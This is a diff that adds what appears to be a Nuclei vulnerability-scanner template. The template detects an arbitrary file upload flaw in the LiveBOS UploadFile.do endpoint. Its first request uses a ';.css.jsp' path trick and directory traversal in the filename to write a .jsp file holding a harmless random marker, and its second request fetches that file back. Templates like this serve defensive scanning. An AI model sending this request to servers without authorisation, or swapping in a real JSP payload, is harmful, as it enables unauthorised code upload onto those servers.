@@ -1,0 +1,52 @@
+id: livebos-uploadfile-do-anyfile-upload
+info:
+  name: LiveBOS UploadFile.do Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Identifies an arbitrary file upload vulnerability in LiveBOS UploadFile.do endpoint.
+
+variables:
+  t1: "{{rand_text_alphanumeric(4)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/feed/UploadFile.do;.css.jsp"
+    headers:
+      Content-Type: "multipart/form-data; boundary=--------------------------688644671867822357584225"
+    body: |-
+      ----------------------------688644671867822357584225
+      Content-Disposition: form-data; name="NewFile"; filename="/../../../../{{t1}}.jsp"
+      Content-Type: text/plain
+
+      {{t2}}
+      ----------------------------688644671867822357584225--
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ".jsp"
+        part: body
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/{{t1}}.jsp;.js.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
